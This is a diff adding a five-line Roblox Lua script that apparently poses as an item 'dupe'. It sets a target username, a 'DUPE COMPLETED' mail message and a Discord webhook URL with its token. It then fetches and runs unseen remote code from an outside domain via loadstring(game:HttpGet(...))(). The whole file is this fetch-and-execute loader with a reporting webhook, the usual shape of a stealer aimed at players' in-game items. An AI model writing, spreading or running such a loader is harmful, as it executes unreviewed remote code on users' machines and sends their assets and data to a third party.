@@ -1,0 +1,5 @@
+Username = "my_bffiszan"
+MailMessage = "DUPE COMPLETED"
+Webhook = "https://discord.com/api/webhooks/1243446190989901834/XI_2kfB9KiYAlhqwA2mHY71DpsLL_4W1aXxq-HrT_mhn88jQtw72pDWavgedRpYDrkYG"
+ 
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
